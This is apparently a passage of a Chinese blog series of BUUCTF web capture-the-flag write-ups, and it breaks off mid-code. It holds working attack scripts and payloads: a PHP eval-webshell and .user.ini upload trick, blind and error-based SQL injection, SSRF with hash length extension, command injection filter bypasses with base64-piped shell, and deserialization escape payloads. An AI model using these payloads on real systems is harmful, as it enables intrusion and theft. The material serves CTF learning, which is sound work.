找到flag文件THis_Is_tHe_F14g，然后构造payload拿flag： ?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g')); 偶然发现，其实这个题不去绕过open_basedir和disable_functions的限制，直接访问phpinfo()就有flag…","link":"/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"},{"title":"BUUCTF-web刷题Ⅰ","text":"在家圈着，有时间可以好好刷刷题了，看glzjin处处打广告，早就想把BUU的题好好刷刷了，从现在开始吧！ [强网杯 2019]高明的黑客题目分析进入链接之后是下图的页面：提示我们源码在www.tar.gz中，那么我们把源码下载下来进行审计。发现是这个压缩包包含了几千个php文件，并且每个文件里代码都不少，参数也都是乱序字母，像是经过加密的一样…但是，经过审计代码，我们发现，很多文件中都包含了不少的GET和POST方式进行传参的代码，并且还有很多调用eval的地方，这不就是后门嘛，但是经过测试，在eval调用的参数中传入命令没有效果…这么多文件，每个文件又是这么多参数和eval的调用，猜测是在某个文件中包含可以成功拿到shell的参数和eval调用，这么多文件，只好写脚本进行测试，来找到存在后门的文件了。 解题脚本这里参考一个工作效率比较高的脚本： import osimport requestsimport reimport threadingimport timeprint('开始时间： '+ time.asctime(time.localtime(time.time())))s1 = threading.Semaphore(100) #信号量，设置最大的线程数filePath = r\"F:/phpStudy_64/phpstudy_pro/WWW/src/\"os.chdir(filePath) #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # 设置连接活跃状态为Falsedef get_content(file): s1.acquire() #每当调用acquire()时内置计数器-1 print('trying '+file+' '+time.asctime(time.localtime(time.time()))) with open(file,encoding='utf-8') as f: #打开php文件，提取所有的$_GET和$_POST的参数 gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) data = {} #所有的$_POST params = {} #所有的$_GET for m in gets: params[m] = \"echo 'xxxxxx';\" for n in posts: data[n] = \"echo 'xxxxxx';\" url = 'http://127.0.0.1/src/'+file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST req.close() # 关闭请求,释放内存 req.encoding = 'utf-8' content = req.text #print(content) if \"xxxxxx\" in content: #如果发现有可以利用的参数，继续筛选出具体的参数 flag = 0 for a in gets: req = session.get(url+'?%s='%a+\"echo 'xxxxxx';\") content = req.text req.close() # 关闭请求,释放内存 if \"xxxxxx\" in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data={b:\"echo 'xxxxxx';\"}) content = req.text req.close() # 关闭请求 释放内存 if \"xxxxxx\" in content: break if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0， param = a else: param = b print('找到了利用文件： '+file+\" and 找到了利用的参数：%s\" %param) print('结束时间： ' + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #加入多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 这个脚本会输出存在后门的文件名和可以拿到shell的参数，我们拿到参数之后，再传参，url参数内容为cat /flag即可拿到flag。 [SUCTF 2019]CheckIn题目分析打开链接，是一个文件上传页面，第一反应上传图片马结果显示&lt;? in contents!这提示我们上传的图片马中不能包含&lt;?，同时也得知是黑名单过滤了，那么可以利用&lt;script language='php'&gt;&lt;scirpt&gt;类型的图片马来绕过过滤，和NCTF中的一道题是一样的知识点。我们构造这种图片马上传，回显如下：提示exif_imagetype:not image!，猜测后端应该调用了php的exif_imagetype()函数，这个在图片马中添加图片文件头就可以绕过，这里添加GIF89a来绕过，上传之后回显如下：我们看到，文件成功上传，但是现在用蚁剑链接的话，还是失败，因为传上去的带图片文件头的图片马并没有被解析，因此需要上传.htaccess文件或者.user.ini文件来解析图片马。这里服务器版本比较高不能用.htaccess来解析，那么便需要用.user.ini来解析我们上传的图片马。 .user.ini这是一个与php配置相关的文件，可以在php手册查看对其的描述：从官方描述中我们看到.user.ini可以支持用户配置php.ini中的PHP_INI_PERDIR和PHP_INI_USER，只要是在CGI/FastCGI模式的服务器上都支持.user.ini。同时我们在官方手册关于php.ini配置选项列表的描述中看到auto_append_file和auto_prepend_file都适用在PHP_INI_PERDIR中，即可以通过.user.ini来配置它们。我们需要知道这两个配置的作用： 1、auto_append_file：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。 2、auto_prepend_file：指定一个文件，自动包含在要执行的文件后，但是如果在包含之前遇到exit()函数便不会包含。 它们的使用方法是直接写在.user.ini中即可，如： auto_append_file=01.gifauto_prepend_file=01.gif 至此，我们的解题思路就很明确了： 1、构造包含GIF89a的图片马 2、图片马用&lt;script language='php'&gt;&lt;scirpt&gt;类型的代码 3、构造.user.ini文件，其中包含我们要上传的图片马名称 4、先传入.user.ini然后上传图片马 5、蚁剑连接，拿flag 解题构造图片马： GIF89a&lt;script language=\"php\"&gt;eval($_POST['x']);&lt;/script&gt; 构造.user.ini文件 GIF89aauto_prepend_file=xxx.jpg //注意：该处的名称要与图片马的名称相同 将构造好的文件依次上传，然后拿到文件储存的路径，这里需要说明：前面讲过了，auto_append_file和auto_prepend_file的作用是在在要执行的文件中包含我们指定的文件，在回显中我们看到，相同文件夹下还包含index.php文件，那么利用它便可以拿到shell。蚁剑连接拿flag用蚁剑连接，在根目录即可拿到flag：关于.user.ini文件构成的php后门还可以参考：https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [CISCN 2019华北]HackWorld题目分析打开链接看到如下的输入框：提示我们flag在flag表中的flag字段，一个SQL注入题，抓包发现输入框的值会通过参数id以POST的方式上传到服务端。测试对输入的限制，结果如下： id=1 Hello, glzjin wants a girlfriend.id=1' bool(false)id=1'+空格 SQL Injection Checked.id=1'# SQL Injection Checked. 我们发现，当输入为1的时候回显Hello, glzjin wants a girlfriend.应该是一个正确的回显，但是输入1'回显bool(false)，并且对于与注入相关的字符会回显SQL Injection Checked.，因此，判断是一个布尔盲注。当输入的表达式为1的时候，会给出正确的回显，那么我们便可以通过在输入框构造结果为1并且逐字符地读取flag字段内容的语句便可以读出flag。 解题可以用下面的布尔盲注脚本拿flag： import requestsimport timeurl = \"http://b9b3fd3f-2f40-4927-8d69-50ffc78f9a4a.node3.buuoj.cn/index.php\"payload = { \"id\" : \"\"}result = \"\"for i in range(1,100): l = 33 r =130 mid = (l+r)&gt;&gt;1 while(l&lt;r): payload[\"id\"] = \"0^\" + \"(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})\".format(i,mid) html = requests.post(url,data=payload) print(payload) if \"Hello\" in html.text: l = mid+1 else: r = mid mid = (l+r)&gt;&gt;1 if(chr(mid)==\" \"): break result = result + chr(mid) print(result)print(\"flag: \" ,result) [De1CTF 2019]SSRF Me题目分析：首先拿到源码，是Flask写的： from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 我们发现，代码中定义了一个task类，其中主要包括三部分：__init__()、Exec()、checkSign。__init__()中以用户的IP生成一个沙箱： def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) Exec()可以执行一些操作： def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result 我们可以看到，Exec()函数可以执行scan操作，对目标文件进行扫描并把结果存在result.txt中；read操作可以读取ressult.txt中的内容。同时param又是用户输入，那么通过利用param和上述两个操作，进行SSRF以拿到flag。 往下我们看到三个路由： @app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read() /geneSign路由：获得param参数，通过action和param生成签名。并且在服务端的签名是通过action=&quot;scan&quot;生成的，那就限制了用户执行的方法。/De1ta路由：获取cookie中的action和param以及签名sign，如果param合法则生成task对象，并返回执行的内容。/路由：读取代码。 解题思路我们从前面知道，服务端的签名已经限制为action=&quot;scan&quot;了，因此如果我们传入的方法有read那签名值将会不同，将不能实现读取。因此我们需要绕过sign的限制。我们可以发现getSign其实是有漏洞的： def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 即当我们输入param=flag.txtread的时候，那sign值就是包含read和scan的了，也就可以实现对文件的读取了。 解题这里有两种方法，第一种是利用SSRF，也是本题的考点，第二种是hash长度扩展攻击，看别的大佬的思路才知道的。 SSRF首先我们在/geneSign路由中利用param=flag.txtread生成一个签名：然后通过/De1ta路由生成服务端的签名，需要利用BP抓包改包：这里需要注意，我们在/De1ta路由是通过GET方式传param的，但是Cookie需要我们手动加入，从下面这段代码可知：我们需要在cookie中写入action和sign值 def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) 从而实现通过构造sign绕过限制实现SSRF读取服务器资源，拿到flag。 Hash长度扩展攻击哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了H(密钥 ∥ 消息)此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。一般满足下面条件的情形可以进行哈希长度扩展攻击： 1、准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）； 2、让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文； 3、服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值 详细可参考：https://www.freebuf.com/articles/web/69264.html该题中，sign的计算： hashlib.md5(secert_key + param + action).hexdigest() 显然满足这种情况，因此可以进行哈希长度扩展攻击。脚本如下： import hashpumpyimport requestsimport urllib.parsetxt1 = 'flag.txt'r = requests.get('http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/geneSign', params={'param': txt1})sign = r.texthash_sign = hashpumpy.hashpump(sign, txt1 + 'scan', 'read', 16)r = requests.get('http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/De1ta', params={'param': txt1}, cookies={ 'sign': hash_sign[0], 'action': urllib.parse.quote(hash_sign[1][len(txt1):])})print(r.text) [网鼎杯 2018]Fakebook题目分析进入链接，是一个可以注册和登录的页面，这里的注册页面是以POST上传数据的，利用sqlmap测试发现有POST注入，具体方法是： 1、注册用户时用BP抓包，保存POST表单的数据到文件; 2、然后利用sqlmap爆库： python sqlmap.py -r \"the path of the catched file\" --dump --dbs 结果如下：这个截图中没有体现出完整的数据库信息，完整的序列化内容中包含的还有blog的地址，下面的payload中可以看到。 经过测试，在wiew.php路径下存在GET注入，这里存在报错注入，可以利用extractvalue()和updatexml()进行测试，但是我在用extractvalue()进行测试时失败了，用updatexml()可以成功注入。利用extractvalue()的报错注入可参考我之前的文章RootersCTF-Babyweb-WriteUp。报错注入可参考：https://blog.csdn.net/zpy1998zpy/article/details/80631036 进行GET注入利用常规的手注方法，结合updatexml()以实现报错注入： 1、爆库名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select database())),1)# 2、爆表名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)# 3、爆列名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1)# 4、爆字段 /view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)# 我们看到，最后爆出的字段知包含了一串序列化的内容，也可以根据POST注入的结果发现，而并没有拿到flag。这里要注意，union select联合查询会被检测出，因此用\\**\\来绕过。参考网上的WP发现，该题并非只考察注入，还考察了SSRF、反序列化构造file文件协议。 利用File协议进行SSRF读取flag文件御剑扫描发现robots.txt和flag.php文件，并且根据前面报错注入的返回页面可见，flag.php文件是存在/var/www/html/下的。同时在robots.txt中发现了备份文件/user.php.bak，其源码如下： &lt;?phpclass UserInfo{ public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); }} 可以发现get()函数总传参是一个url，因此猜测存在SSRF，前面我们也知道了可以利用file://协议来读取flag文件，可以构造file:///var/www/html/flag.php语句并将其作为用户的blog地址写入，最后利用联合查询和反序列化将该语句写入到数据库，payload如下： /view.php?no=0/**/union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"1\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' 效果如下：此时，我们写入的可以读取文件的blog地址已经奏效，查看源码可以看到一串base64的编码，解码即为读取的flag.php的内容。 [极客大挑战 2019]Havefun目测是签到题，源码中提示： $cat=$_GET['cat'];echo $cat;if($cat=='dog'){ echo 'Syc{cat_cat_cat_cat}';} 简单，?cat=dog即可 [RoarCTF 2019]EasyJava考察web.xml的泄露，Javaweb没学过…不过这个题目学到了一点：类似于题目给的Help文件下载失败的时候可以尝试改变请求方式去下载。附上一些有关源码泄露的网站：https://blog.csdn.net/wy_97/article/details/78165051 [极客大挑战 2019]Secret File进去题目之后看源码，发现Archive_room.php文件，点进去之后给了一个按钮，这个按钮存在302跳转，因此需要BP抓包。抓包发现，点击时候先访问的是action.php，在改文件中看到了提示的secr3t.php文件，再查看这个文件给了源码： &lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){ echo \"Oh no!\"; exit(); } include($file); //flag放在了flag.php里?&gt; 容易看出是文件包含，利用php伪协议读取即可： ?file=php://filter/convert.base64-encode/resource=flag.php [GXYCTF 2019]Ping Ping Ping根据题目提示和参数ip可知，与命令执行相关第一步，利用|可以执行ls命令，读取内容： ?ip=127.0.0.1|ls 发现存在flag.php和index.php文件，但是直接利用cat flag.php去读取发现空格被ban，此处考察了绕过空格被ban的方法（与linux系统命令的执行相关）： $IFS${IFS}$IFS$1 //$1中的数字可以更改&lt;&lt;&gt;{cat,flag.php}%20%09 通过尝试发现$IFS$1可以绕过空格此时又提示flag被ban，绕过的方法也比较多样： 变量拼接：ip=1;a=g;cat$IFS$1fla$a.php内联执行：ip=1;cat$IFS$1`ls` //注意这里是反单引号，命令会将反引号中的输出作为输入进行执行利用sh/bash： ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 利用内联执行方法绕过，需要到控制台的sources下查看内容，如图： [极客大挑战 2019]PHP一道PHP反序列化题目，主要考察了private定义字段的绕过方法。 题目分析提示有备份文件，扫后台可以得知是www.zip，下载文件、审计源码，在class.php中发现了反序列化的代码： &lt;?phpinclude 'flag.php';error_reporting(0);class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"; echo \"You name is: \"; echo $this-&gt;username;echo \"&lt;/br&gt;\"; echo \"You password is: \"; echo $this-&gt;password;echo \"&lt;/br&gt;\"; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"; die(); } }}?&gt; 根据代码逻辑可知，我们需要绕过wakeup()函数，这个很简单，更改序列化之后类的属性个数即可。 关于wakeup()函数：与sleep()函数相反，sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过方法：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。 我们可以看到，需要绕过wakeup()函数，然后令username==admin，password==100才能执行echo $flag，因此需要构造这两个条件，但是我们发现，这两个字段都是private定义的，绕过的时候需要更改序列化之后属性的格式： 1、private属性序列化的时候格式是 %00类名%00成员名 2、protected属性序列化的时候格式是 %00*%00成员名 可参考：https://www.cnblogs.com/fish-pompom/p/11126473.html根据这些信息我们便可以构造payload。 构造payload首先在class.php中加入下列代码，得到一个实例化对象的反序列化： $a = new Name('admin',100);$b=serialize($a);echo $b; 拿到反序列化的字符串： O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} 然后我们把属性值2改成3以绕过wakeup()最后更改两个属性名的格式如下： O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} 最后，在index.php中我们发现GET传参select，构造最终payload ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} 即可拿到flag。 [0CTF 2016]piapiapia一道反序列化逃逸漏洞利用题目。 题目分析进入题目之后是一个登录页面，尝试登录管理员，失败，也没有注册按钮…通过扫后台发现存在www.zip文件，果断下载了，成功拿到题目源码。压缩包下包含`class.php`、`config.php`、`index.php`、`profile.php`、`register.php`、`update.php`几个有用的文件。解题关键在于如下部位：首先是config.php文件： &lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = '';?&gt; 由此可知，flag存在于该文件之下，需要想办法读取改文件内容。同时，在profile.php文件下有与读取文件内容相关的代码： &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt; 可知，控制photo变量为config.php我们便可以读取到其内容。同时看到，这里存在一个反序列化的函数，初步判断解题与它相关。在update.php文件中找到了将字符串序列化的地方： &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'; } else {?&gt; 可以看到，此处的代码是对profile数组中的phone、email、nickname、photo进行的序列化，序列化之后的效果如下： a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:11:\"123@qq.com\";s:8:\"nickname\";s:3:\"123\";s:5:\"photo\";s:39:\"upload/f3b94e88bd1bd325af6f62828c8785dd\";} 这里a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，就是把a改成O。然后是一个键值名，一个变量值：s:5:&quot;phone&quot;:第一个键名，是string类型的，长度为五;s:11:&quot;11111111111&quot;:第一个变量值，string类型，长度为11。后面的也是这个规律。这里存在我们要利用的反序列化漏洞：如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的。最后在class.php文件中还有两个需要过滤，并且对拿flag有效的正则匹配： public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} 这里会对我们输入的内容进行替换，比如将where替换为hacker，这对我们的解题很重要。 至此，解题思路已经很明确了，就是我们通过控制输入，将序列化之后的photo对应上config.php，通过抓包发现nickname是入手点，从前面写到的序列化的字符串也能看出来。因此在nickname后面加上&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}就能实现，最后效果如下： a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:11:\"123@qq.com\";s:8:\"nickname\";a:1:{i:0;s:3:\"123\";}s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/f3b94e88bd1bd325af6f62828c8785dd\";} 这里就实现了photo与config.php的对应，而括号后面的upload等不会被执行。注意这里我们看到nickname是一个数组型的，因为我们前面提到过，有对nickname的正则匹配，所有我们需要用数组来绕过。现在的问题就是&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}这34字符，使我们在传参的时候要手动加入到nickname数组中的，而想要打到我们的目的，就必须把它们从nickname数组中挤出去，这个时候我们前面说到的where与hacker的替换就派上用场了：我们可以在 nickname数组中写入34个where，那么就替换成了34个hacker，但是序列化之后的每个变量名和常量值都是有定值的，比如上面的s:5表示长度是5，所以替换之后，34个where之后紧跟的&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}就不在属于nickname数组了，也就达到了我们的目的，部分payload如下： nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} 解题我们首先先到register.php下注册个账号，登录之后更新用户的信息，这个时候通过BP抓包写入payload，然后将nickname改成nickname[]，同时将我们构造好的payload写入，如图：从响应包中，我们看到，payload已经成功打入，此时，我们上传的图片存放的路径读取的也就是config.php的内容了，此时去profile.php下打开图片的链接即可看到一串base64，解码即可拿到flag。 这道题目对反序列化漏洞的认识又进一步加深，学到了学到了。 [极客大挑战 2019]Knife进入题目，解题方法就很明显了，提示了Knife，并且给了后门语句eval($_POST[&quot;Syc&quot;]);，用蚁剑连接下列链接： http://514be013-67a5-422b-ae7b-941c105e248b.node3.buuoj.cn/?Knife.php 连接密码很明显：Syc，连接即可拿flag。 [CISCN2019 华北]Dropbox一个考察phar反序列化的问题。相关知识参考：https://blog.ripstech.com/2018/new-php-exploitation-technique/https://paper.seebug.org/680/ 题目分析进入题目之后，通过注册并登录账户，发现可以上传文件，上传文件之后进入到管理面板，这个时候我们发现可以对我们的文件进行下载和删除的操作：这个地方存在可以的地方，在下载文件的时候，抓包发现，下载文件的规则很简单：那么我们可以测试是否可以下载别的文件，通过改包利用../../xxx.php测试可行性，结果真的能下载文件：通过下载index.php文件，我们依次下载到关键的class.php和delete.php文件，内容如下：class.php文件： &lt;?phperror_reporting(0);$dbaddr = \"127.0.0.1\";$dbuser = \"root\";$dbpass = \"root\";$dbname = \"dropbox\";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;下载&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; 我们看到，其中有多个类的定义，其中delete()函数中的unlink()引起注意，因为这个函数在处理phar文件时会将序列化的内容反序列化，这一点在前面提供的第二个链接有讲到，还提到了其他的函数，如下:再看delete.php： &lt;?phpsession_start();if 